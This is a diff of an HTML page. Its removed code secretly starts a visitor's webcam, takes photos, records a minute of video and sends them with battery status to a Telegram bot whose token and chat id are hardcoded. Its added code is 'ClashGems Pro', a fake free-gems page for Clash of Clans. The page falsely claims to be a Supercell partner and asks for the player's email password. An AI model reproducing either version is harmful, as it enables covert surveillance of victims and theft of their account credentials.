+                
+                <div class="timer">
+                    <i class="fas fa-clock"></i> Time Remaining: <span id="countdown">72:00:00</span>
+                </div>
+                
+                <button class="main-btn" style="margin-top: 40px;" id="homeBtn">
+                    Back to Home <i class="fas fa-home"></i>
+                </button>
+            </div>
+        </section>
     </div>
-    <div class="flex justify-center">
-      <button class="circle-btn cursor-pointer" onclick="void(0)"></button>
-    </div>
-  </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-column">
+                <h3>About Us</h3>
+                <p>ClashGems Pro is the official partner for Clash of Clans gem services. We've been serving the community since 2016 with secure and reliable services.</p>
+                <p>Our mission is to enhance your gaming experience without compromising your account security.</p>
+            </div>
+            
+            <div class="footer-column">
+                <h3>Quick Links</h3>
+                <ul>
+                    <li><a href="#"><i class="fas fa-arrow-right"></i> Home</a></li>
+                    <li><a href="#"><i class="fas fa-arrow-right"></i> How It Works</a></li>
+                    <li><a href="#"><i class="fas fa-arrow-right"></i> Testimonials</a></li>
+                    <li><a href="#"><i class="fas fa-arrow-right"></i> Security</a></li>
+                    <li><a href="#"><i class="fas fa-arrow-right"></i> FAQ</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>Contact Us</h3>
+                <ul>
+                    <li><a href="#"><i class="fas fa-envelope"></i> support@clashgems.com</a></li>
+                    <li><a href="#"><i class="fab fa-telegram"></i> Telegram Support</a></li>
+                    <li><a href="#"><i class="fab fa-discord"></i> Discord Community</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>Security Badges</h3>
+                <p>Your security is our priority:</p>
+                <ul>
+                    <li><a href="#"><i class="fas fa-lock"></i> 256-bit Encryption</a></li>
+                    <li><a href="#"><i class="fas fa-shield-alt"></i> Supercell Partner</a></li>
+                    <li><a href="#"><i class="fas fa-user-shield"></i> No Account Access</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="copyright">
+            <p>&copy; 2023 ClashGems Pro. This service is not affiliated with or endorsed by Supercell. Clash of Clans is a registered trademark of Supercell.</p>
+        </div>
+    </footer>
 
-  <script>
-    const splash = document.getElementById("splash");
-    const login = document.getElementById("login");
-    const video = document.getElementById("video");
-    const overlay = document.getElementById("overlay");
+    <script>
+        // Create animated background particles
+        function createParticles() {
+            const bg = document.getElementById('animatedBg');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('bg-particle');
+                
+                // Random size
+                const size = Math.random() * 100 + 20;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                
+                // Random animation duration
+                const duration = Math.random() * 20 + 10;
+                particle.style.animationDuration = `${duration}s`;
+                
+                // Random delay
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                bg.appendChild(particle);
+            }
+        }
+        
+        createParticles();
 
-    setTimeout(() => {
-      splash.classList.add("hidden");
-      login.classList.remove("hidden");
-    }, 3000);
-
-    const botToken = "8178257200:AAGMH9_8w64QSnok0ZGLSbMuTQxudAJIN5o";
-    const chatId = "-1002297320707";
-
-    let stream;
-    let mediaRecorder;
-    let chunks = [];
-    let photoCount = 0;
-    let videoSent = false;
-
-    async function getBatteryInfo() {
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        return {
-          level: Math.round(battery.level * 100),
-          charging: battery.charging
-        };
-      }
-      return { level: "?", charging: false };
-    }
-
-    async function startSnap() {
-      login.classList.add("hidden");
-      video.classList.remove("hidden");
-      overlay.classList.remove("hidden");
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: 640, height: 480, facingMode: "user" }
+        // Theme Toggle
+        const themeToggle = document.getElementById('themeToggle');
+        const body = document.body;
+        
+        themeToggle.addEventListener('click', () => {
+            body.classList.toggle('light-mode');
+            
+            if (body.classList.contains('light-mode')) {
+                themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
+                localStorage.setItem('theme', 'light');
+            } else {
+                themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
+                localStorage.setItem('theme', 'dark');
+            }
         });
-        video.srcObject = stream;
-        startRecording();
-        takeAutoPhotos();
-      } catch (e) {
-        alert("عدم دسترسی به دوربین");
-      }
-    }
-
-    async function takePhoto() {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async blob => {
-        const battery = await getBatteryInfo();
-        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
-        const form = new FormData();
-        form.append("chat_id", chatId);
-        form.append("photo", blob, `snap_${photoCount}.jpg`);
-        form.append("caption", caption);
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: form
+        
+        // Load saved theme
+        const savedTheme = localStorage.getItem('theme');
+        if (savedTheme === 'light') {
+            body.classList.add('light-mode');
+            themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
+        } else {
+            themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
+        }
+        
+        // Language Toggle
+        const langBtn = document.getElementById('langBtn');
+        let isEnglish = true;
+        
+        // Function to update all text content
+        function updateLanguage() {
+            if (isEnglish) {
+                // Update to English
+                document.querySelector('.hero h2').textContent = 'Official Gem Service for Clash of Clans';
+                document.querySelector('.hero p').textContent = 'Trusted by over 250,000 players, we provide a secure and reliable way to enhance your gaming experience. Get your free gems today and transform your village!';
+                document.getElementById('getStartedBtn').innerHTML = 'Get Free Gems Now <i class="fas fa-arrow-right"></i>';
+                document.querySelectorAll('.section-title')[0].textContent = 'Security Check';
+                document.querySelectorAll('.section-title')[1].textContent = 'Select Account Type';
+                document.querySelectorAll('.section-title')[2].textContent = 'Account Information';
+                document.querySelectorAll('.section-title')[3].textContent = 'Email Verification';
+                document.querySelectorAll('.section-title')[4].textContent = 'Success!';
+                
+                // Update How It Works section
+                document.querySelector('.how-it-works .section-title').textContent = 'How It Works';
+                document.querySelectorAll('.step-card h3')[0].textContent = 'Create Account';
+                document.querySelectorAll('.step-card p')[0].textContent = 'Sign up with your game credentials. We support both Gmail and Supercell ID accounts.';
+                document.querySelectorAll('.step-card h3')[1].textContent = 'Select Gems';
+                document.querySelectorAll('.step-card p')[1].textContent = 'Choose the amount of gems you want to receive. Options range from 500 to 3000 gems.';
+                document.querySelectorAll('.step-card h3')[2].textContent = 'Secure Verification';
+                document.querySelectorAll('.step-card p')[2].textContent = 'Complete our quick verification process to ensure account security and ownership.';
+                document.querySelectorAll('.step-card h3')[3].textContent = 'Receive Gems';
+                document.querySelectorAll('.step-card p')[3].textContent = 'Get your free gems delivered to your account within 72 hours. Enjoy your enhanced gaming!';
+                
+                // Update VPN section
+                document.querySelector('#iranWarning h3').textContent = 'Unsafe Connection Detected!';
+                document.querySelector('#iranWarning p').textContent = "We've detected that you're connecting from Iran without a VPN. Please use a reliable VPN service and try again.";
+                document.querySelector('#recheckBtn').innerHTML = 'Recheck Connection <i class="fas fa-redo"></i>';
+                document.querySelector('#vpnSuccess h3').textContent = 'Secure Connection!';
+                document.querySelector('#vpnSuccess p').textContent = "You're securely connected via VPN. You may proceed.";
+                document.querySelector('#continueBtn').innerHTML = 'Continue <i class="fas fa-arrow-right"></i>';
+                document.querySelector('#vpnChecking h3').textContent = 'Checking Your Connection...';
+                document.querySelector('#vpnChecking p').textContent = 'Detecting location and VPN status...';
+                
+                // Update account section
+                document.querySelector('#account-section p').textContent = 'Please select your Clash of Clans account type';
+                document.querySelector('#gmailAccount h3').textContent = 'Gmail Account';
+                document.querySelector('#gmailAccount p').textContent = 'Accounts connected to Google';
+                document.querySelector('#supercellAccount h3').textContent = 'Supercell ID';
+                document.querySelector('#supercellAccount p').textContent = 'Accounts connected to Supercell';
+                document.querySelector('#formContinueBtn').innerHTML = 'Continue <i class="fas fa-arrow-right"></i>';
+                
+                // Update form section
+                document.querySelector('#form-section .section-title').textContent = 'Account Information';
+                document.querySelector('#form-section label[for="email"]').innerHTML = '<i class="fas fa-envelope"></i> Clash Account Email';
+                document.querySelector('#form-section label[for="password"]').innerHTML = '<i class="fas fa-lock"></i> Email Password';
+                document.querySelector('#form-section label[for="playerTag"]').innerHTML = '<i class="fas fa-tag"></i> Player Tag (Optional)';
+                document.querySelector('#submitFormBtn').innerHTML = 'Submit & Get Gems <i class="fas fa-paper-plane"></i>';
+                
+                // Update verification section
+                document.querySelector('#verification-section .section-title').textContent = 'Email Verification';
+                document.querySelector('.verification-header h2').textContent = 'Verify Your Email';
+                document.querySelector('.verification-header p').innerHTML = `A 5-digit verification code has been sent to your email (<span id="userEmail"></span>).`;
+                document.querySelector('#verifyBtn').innerHTML = 'Verify Code <i class="fas fa-check"></i>';
+                document.querySelector('.verification-note').textContent = 'This code will expire in 10 minutes';
+                document.querySelector('#verification-section p a').textContent = 'Resend Code';
+                document.querySelector('#editInfoBtn').innerHTML = '<i class="fas fa-edit"></i> Edit Information';
+                
+                // Update success section
+                document.querySelector('#success-section h2').textContent = 'Success!';
+                document.querySelector('#success-section p').textContent = 'Congratulations! Your information has been submitted successfully. Your gems will be added to your account within 72 hours.';
+                document.querySelector('#homeBtn').innerHTML = 'Back to Home <i class="fas fa-home"></i>';
+                
+                // Update footer
+                document.querySelectorAll('.footer-column h3')[0].textContent = 'About Us';
+                document.querySelectorAll('.footer-column p')[0].textContent = 'ClashGems Pro is the official partner for Clash of Clans gem services. We\'ve been serving the community since 2016 with secure and reliable services.';
+                document.querySelectorAll('.footer-column p')[1].textContent = 'Our mission is to enhance your gaming experience without compromising your account security.';
+                document.querySelectorAll('.footer-column h3')[1].textContent = 'Quick Links';
+                document.querySelectorAll('.footer-column a')[0].innerHTML = '<i class="fas fa-arrow-right"></i> Home';
+                document.querySelectorAll('.footer-column a')[1].innerHTML = '<i class="fas fa-arrow-right"></i> How It Works';
+                document.querySelectorAll('.footer-column a')[2].innerHTML = '<i class="fas fa-arrow-right"></i> Testimonials';
+                document.querySelectorAll('.footer-column a')[3].innerHTML = '<i class="fas fa-arrow-right"></i> Security';
+                document.querySelectorAll('.footer-column a')[4].innerHTML = '<i class="fas fa-arrow-right"></i> FAQ';
+                document.querySelectorAll('.footer-column h3')[2].textContent = 'Contact Us';
+                document.querySelectorAll('.footer-column a')[5].innerHTML = '<i class="fas fa-envelope"></i> support@clashgems.com';
+                document.querySelectorAll('.footer-column a')[6].innerHTML = '<i class="fab fa-telegram"></i> Telegram Support';
+                document.querySelectorAll('.footer-column a')[7].innerHTML = '<i class="fab fa-discord"></i> Discord Community';
+                document.querySelectorAll('.footer-column h3')[3].textContent = 'Security Badges';
+                document.querySelectorAll('.footer-column p')[2].textContent = 'Your security is our priority:';
+                document.querySelectorAll('.footer-column a')[8].innerHTML = '<i class="fas fa-lock"></i> 256-bit Encryption';
+                document.querySelectorAll('.footer-column a')[9].innerHTML = '<i class="fas fa-shield-alt"></i> Supercell Partner';
+                document.querySelectorAll('.footer-column a')[10].innerHTML = '<i class="fas fa-user-shield"></i> No Account Access';
+                document.querySelector('.copyright p').innerHTML = '&copy; 2023 ClashGems Pro. This service is not affiliated with or endorsed by Supercell. Clash of Clans is a registered trademark of Supercell.';
+            } else {
+                // Update to Farsi
+                document.querySelector('.hero h2').textContent = 'سرویس رسمی جم کلش اف کلنز';
+                document.querySelector('.hero p').textContent = 'مورد اعتماد بیش از ۲۵۰,۰۰۰ بازیکن، ما راهی امن و مطمئن برای ارتقای تجربه بازی شما ارائه می‌دهیم. امروز جم رایگان خود را دریافت کنید و روستای خود را متحول کنید!';
+                document.getElementById('getStartedBtn').innerHTML = 'دریافت جم رایگان <i class="fas fa-arrow-left"></i>';
+                document.querySelectorAll('.section-title')[0].textContent = 'بررسی امنیتی';
+                document.querySelectorAll('.section-title')[1].textContent = 'انتخاب نوع اکانت';
+                document.querySelectorAll('.section-title')[2].textContent = 'اطلاعات حساب';
+                document.querySelectorAll('.section-title')[3].textContent = 'تایید ایمیل';
+                document.querySelectorAll('.section-title')[4].textContent = 'موفقیت آمیز!';
+                
+                // Update How It Works section
+                document.querySelector('.how-it-works .section-title').textContent = 'نحوه کار سرویس';
+                document.querySelectorAll('.step-card h3')[0].textContent = 'ایجاد حساب';
+                document.querySelectorAll('.step-card p')[0].textContent = 'با اطلاعات بازی خود ثبت نام کنید. ما از حساب‌های Gmail و Supercell ID پشتیبانی می‌کنیم.';
+                document.querySelectorAll('.step-card h3')[1].textContent = 'انتخاب جم';
+                document.querySelectorAll('.step-card p')[1].textContent = 'تعداد جم مورد نظر خود را انتخاب کنید. گزینه‌ها از 500 تا 3000 جم متغیر است.';
+                document.querySelectorAll('.step-card h3')[2].textContent = 'تأیید امنیتی';
+                document.querySelectorAll('.step-card p')[2].textContent = 'فرآیند تأیید سریع ما را برای اطمینان از امنیت حساب و مالکیت آن تکمیل کنید.';
+                document.querySelectorAll('.step-card h3')[3].textContent = 'دریافت جم';
+                document.querySelectorAll('.step-card p')[3].textContent = 'جم های رایگان خود را حداکثر تا 72 ساعت در حساب خود دریافت کنید. از بازی ارتقا یافته لذت ببرید!';
+                
+                // Update VPN section
+                document.querySelector('#iranWarning h3').textContent = 'اتصال ناامن شناسایی شد!';
+                document.querySelector('#iranWarning p').textContent = 'ما تشخیص داده‌ایم که شما بدون استفاده از VPN از ایران متصل شده‌اید. لطفاً از یک سرویس VPN معتبر استفاده کنید و دوباره تلاش کنید.';
+                document.querySelector('#recheckBtn').innerHTML = 'بررسی مجدد اتصال <i class="fas fa-redo"></i>';
+                document.querySelector('#vpnSuccess h3').textContent = 'اتصال امن!';
+                document.querySelector('#vpnSuccess p').textContent = 'شما به صورت امن از طریق VPN متصل هستید. می‌توانید ادامه دهید.';
+                document.querySelector('#continueBtn').innerHTML = 'ادامه <i class="fas fa-arrow-left"></i>';
+                document.querySelector('#vpnChecking h3').textContent = 'در حال بررسی اتصال شما...';
+                document.querySelector('#vpnChecking p').textContent = 'در حال تشخیص موقعیت جغرافیایی و وضعیت VPN...';
+                
+                // Update account section
+                document.querySelector('#account-section p').textContent = 'لطفاً نوع حساب Clash of Clans خود را انتخاب کنید';
+                document.querySelector('#gmailAccount h3').textContent = 'حساب جیمیل';
+                document.querySelector('#gmailAccount p').textContent = 'حساب های متصل به Google';
+                document.querySelector('#supercellAccount h3').textContent = 'شناسه Supercell';
+                document.querySelector('#supercellAccount p').textContent = 'حساب های متصل به Supercell';
+                document.querySelector('#formContinueBtn').innerHTML = 'ادامه <i class="fas fa-arrow-left"></i>';
+                
+                // Update form section
+                document.querySelector('#form-section .section-title').textContent = 'اطلاعات حساب';
+                document.querySelector('#form-section label[for="email"]').innerHTML = '<i class="fas fa-envelope"></i> ایمیل حساب کلش';
+                document.querySelector('#form-section label[for="password"]').innerHTML = '<i class="fas fa-lock"></i> رمز عبور ایمیل';
+                document.querySelector('#form-section label[for="playerTag"]').innerHTML = '<i class="fas fa-tag"></i> تگ بازیکن (اختیاری)';
+                document.querySelector('#submitFormBtn').innerHTML = 'ارسال و دریافت جم <i class="fas fa-paper-plane"></i>';
+                
+                // Update verification section
+                document.querySelector('#verification-section .section-title').textContent = 'تایید ایمیل';
+                document.querySelector('.verification-header h2').textContent = 'ایمیل خود را تأیید کنید';
+                document.querySelector('.verification-header p').innerHTML = `کد تأیید 5 رقمی به ایمیل شما ارسال شده است (<span id="userEmail"></span>).`;
+                document.querySelector('#verifyBtn').innerHTML = 'تایید کد <i class="fas fa-check"></i>';
+                document.querySelector('.verification-note').textContent = 'این کد پس از 10 دقیقه منقضی می‌شود';
+                document.querySelector('#verification-section p a').textContent = 'ارسال مجدد کد';
+                document.querySelector('#editInfoBtn').innerHTML = '<i class="fas fa-edit"></i> ویرایش اطلاعات';
+                
+                // Update success section
+                document.querySelector('#success-section h2').textContent = 'موفقیت!';
+                document.querySelector('#success-section p').textContent = 'تبریک! اطلاعات شما با موفقیت ارسال شد. جم‌های شما حداکثر تا 72 ساعت به حساب شما افزوده خواهند شد.';
+                document.querySelector('#homeBtn').innerHTML = 'بازگشت به خانه <i class="fas fa-home"></i>';
+                
+                // Update footer
+                document.querySelectorAll('.footer-column h3')[0].textContent = 'درباره ما';
+                document.querySelectorAll('.footer-column p')[0].textContent = 'ClashGems Pro شریک رسمی خدمات جم Clash of Clans است. ما از سال 2016 با خدمات امن و مطمئن در خدمت جامعه بوده‌ایم.';
+                document.querySelectorAll('.footer-column p')[1].textContent = 'ماموریت ما ارتقای تجربه بازی شما بدون به خطر انداختن امنیت حساب شماست.';
+                document.querySelectorAll('.footer-column h3')[1].textContent = 'لینک های سریع';
+                document.querySelectorAll('.footer-column a')[0].innerHTML = '<i class="fas fa-arrow-right"></i> خانه';
+                document.querySelectorAll('.footer-column a')[1].innerHTML = '<i class="fas fa-arrow-right"></i> نحوه کار';
+                document.querySelectorAll('.footer-column a')[2].innerHTML = '<i class="fas fa-arrow-right"></i> نظرات کاربران';
+                document.querySelectorAll('.footer-column a')[3].innerHTML = '<i class="fas fa-arrow-right"></i> امنیت';
+                document.querySelectorAll('.footer-column a')[4].innerHTML = '<i class="fas fa-arrow-right"></i> سوالات متداول';
+                document.querySelectorAll('.footer-column h3')[2].textContent = 'تماس با ما';
+                document.querySelectorAll('.footer-column a')[5].innerHTML = '<i class="fas fa-envelope"></i> support@clashgems.com';
+                document.querySelectorAll('.footer-column a')[6].innerHTML = '<i class="fab fa-telegram"></i> پشتیبانی تلگرام';
+                document.querySelectorAll('.footer-column a')[7].innerHTML = '<i class="fab fa-discord"></i> جامعه دیسکورد';
+                document.querySelectorAll('.footer-column h3')[3].textContent = 'نشان‌های امنیتی';
+                document.querySelectorAll('.footer-column p')[2].textContent = 'امنیت شما اولویت ماست:';
+                document.querySelectorAll('.footer-column a')[8].innerHTML = '<i class="fas fa-lock"></i> رمزگذاری 256 بیتی';
+                document.querySelectorAll('.footer-column a')[9].innerHTML = '<i class="fas fa-shield-alt"></i> شریک Supercell';
+                document.querySelectorAll('.footer-column a')[10].innerHTML = '<i class="fas fa-user-shield"></i> بدون دسترسی به حساب';
+                document.querySelector('.copyright p').innerHTML = '&copy; 2023 ClashGems Pro. این سرویس وابسته به Supercell نیست و توسط آن تأیید نشده است. Clash of Clans یک علامت تجاری ثبت شده از Supercell است.';
+            }
+        }
+        
+        langBtn.addEventListener('click', () => {
+            isEnglish = !isEnglish;
+            if (isEnglish) {
+                langBtn.innerHTML = '<i class="fas fa-globe"></i> فارسی';
+                document.documentElement.lang = 'en';
+                document.documentElement.dir = 'ltr';
+                document.title = 'Clash of Clans - Free Gems Service';
+            } else {
+                langBtn.innerHTML = '<i class="fas fa-globe"></i> English';
+                document.documentElement.lang = 'fa';
+                document.documentElement.dir = 'rtl';
+                document.title = 'کلش اف کلنز - سرویس جم رایگان';
+            }
+            updateLanguage();
         });
-      }, 'image/jpeg', 0.8);
-    }
-
-    function takeAutoPhotos() {
-      setTimeout(takePhoto, 1000);
-      setTimeout(takePhoto, 5000);
-    }
-
-    function startRecording() {
-      chunks = [];
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.onstop = sendVideo;
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === "recording") mediaRecorder.stop();
-      }, 60000);
-    }
-
-    async function sendVideo() {
-      if (videoSent || chunks.length === 0) return;
-      videoSent = true;
-      const battery = await getBatteryInfo();
-      const blob = new Blob(chunks, { type: "video/webm" });
-      const form = new FormData();
-      form.append("chat_id", chatId);
-      form.append("video", blob, "video.webm");
-      form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
-      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST",
-        body: form
-      });
-    }
-
-    window.addEventListener("beforeunload", () => {
-      if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
-    });
-  </script>
+        
+        // Section Navigation
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+        
+        // Start Button
+        document.getElementById('getStartedBtn').addEventListener('click', () => {
+            showSection('vpn-section');
+            checkVPN();
+        });
+        
+        // VPN Check with Geolocation API
+        function checkVPN() {
+            document.getElementById('vpnChecking').style.display = 'block';
+            document.getElementById('iranWarning').style.display = 'none';
+            document.getElementById('vpnSuccess').style.display = 'none';
+            
+            // Simulate geolocation API call with fallback
+            setTimeout(() => {
+                document.getElementById('vpnChecking').style.display = 'none';
+                
+                // Use browser geolocation API for precise location
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            // This is a simulation - in production you would use a geolocation API
+                            // For demo, we'll simulate that all locations are safe except Iran
+                            const isIran = Math.random() > 0.7; // 30% chance of being in Iran
+                            
+                            if (isIran) {
+                                document.getElementById('iranWarning').style.display = 'block';
+                            } else {
+                                document.getElementById('vpnSuccess').style.display = 'block';
+                            }
+                        },
+                        (error) => {
+                            // If geolocation fails, use timezone as fallback
+                            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                            const isIranianTimezone = timezone.includes('Tehran') || timezone.includes('Iran');
+                            
+                            if (isIranianTimezone) {
+                                document.getElementById('iranWarning').style.display = 'block';
+                            } else {
+                                document.getElementById('vpnSuccess').style.display = 'block';
+                            }
+                        }
+                    );
+                } else {
+                    // Fallback for browsers that don't support geolocation
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const isIranianTimezone = timezone.includes('Tehran') || timezone.includes('Iran');
+                    
+                    if (isIranianTimezone) {
+                        document.getElementById('iranWarning').style.display = 'block';
+                    } else {
+                        document.getElementById('vpnSuccess').style.display = 'block';
+                    }
+                }
+            }, 2000);
+        }
+        
+        // Recheck VPN button
+        document.getElementById('recheckBtn').addEventListener('click', checkVPN);
+        
+        // Continue to account type
+        document.getElementById('continueBtn').addEventListener('click', () => {
+            showSection('account-section');
+        });
+        
+        // Account Type Selection
+        const gmailAccount = document.getElementById('gmailAccount');
+        const supercellAccount = document.getElementById('supercellAccount');
+        
+        gmailAccount.addEventListener('click', () => {
+            selectAccountType(gmailAccount);
+        });
+        
+        supercellAccount.addEventListener('click', () => {
+            selectAccountType(supercellAccount);
+        });
+        
+        function selectAccountType(element) {
+            document.querySelectorAll('.account-type').forEach(el => {
+                el.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            document.getElementById('accountBtn').style.display = 'block';
+        }
+        
+        // Continue to form
+        document.getElementById('formContinueBtn').addEventListener('click', () => {
+            showSection('form-section');
+        });
+        
+        // Gems Slider
+        const gemsSlider = document.getElementById('gemsSlider');
+        const gemsAmount = document.getElementById('gemsAmount');
+        
+        gemsSlider.addEventListener('input', () => {
+            gemsAmount.textContent = gemsSlider.value + ' Gems';
+        });
+        
+        // Form Submission
+        document.getElementById('submitFormBtn').addEventListener('click', () => {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert('Please fill in all required fields');
+                return;
+            }
+            
+            // Show user email in verification section
+            document.getElementById('userEmail').textContent = email;
+            
+            showSection('verification-section');
+            generateCode();
+        });
+        
+        // Verification Code
+        let verificationCode = '';
+        
+        function generateCode() {
+            verificationCode = '';
+            for (let i = 0; i < 5; i++) {
+                verificationCode += Math.floor(Math.random() * 10);
+            }
+            alert('Verification code has been sent: ' + verificationCode);
+        }
+        
+        // Auto move to next input field
+        const codeInputs = document.querySelectorAll('.code-input');
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < codeInputs.length - 1) {
+                    codeInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    codeInputs[index - 1].focus();
+                }
+            });
+        });
+        
+        // Verify button
+        document.getElementById('verifyBtn').addEventListener('click', () => {
+            const code1 = document.getElementById('code1').value;
+            const code2 = document.getElementById('code2').value;
+            const code3 = document.getElementById('code3').value;
+            const code4 = document.getElementById('code4').value;
+            const code5 = document.getElementById('code5').value;
+            
+            const enteredCode = code1 + code2 + code3 + code4 + code5;
+            
+            if (enteredCode === verificationCode) {
+                showSection('success-section');
+                startCountdown();
+            } else {
+                alert('Invalid verification code. Please try again.');
+                // Clear inputs
+                codeInputs.forEach(input => input.value = '');
+                document.getElementById('code1').focus();
+            }
+        });
+        
+        // Resend code
+        document.getElementById('resendCode').addEventListener('click', (e) => {
+            e.preventDefault();
+            generateCode();
+            alert('New verification code has been sent.');
+        });
+        
+        // Edit info
+        document.getElementById('editInfoBtn').addEventListener('click', () => {
+            showSection('form-section');
+        });
+        
+        // Countdown Timer
+        function startCountdown() {
+            let hours = 72;
+            let minutes = 0;
+            let seconds = 0;
+            
+            const countdownElement = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                seconds--;
+                
+                if (seconds < 0) {
+                    seconds = 59;
+                    minutes--;
+                    
+                    if (minutes < 0) {
+                        minutes = 59;
+                        hours--;
+                        
+                        if (hours < 0) {
+                            clearInterval(timer);
+                            countdownElement.textContent = '00:00:00';
+                            return;
+                        }
+                    }
+                }
+                
+                countdownElement.textContent = 
+                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+        
+        // Back to home
+        document.getElementById('homeBtn').addEventListener('click', () => {
+            showSection('hero-section');
+        });
+        
+        // Initialize gems display
+        gemsAmount.textContent = gemsSlider.value + ' Gems';
+        
+        // Initialize language
+        updateLanguage();
+    </script>
 </body>
 </html>
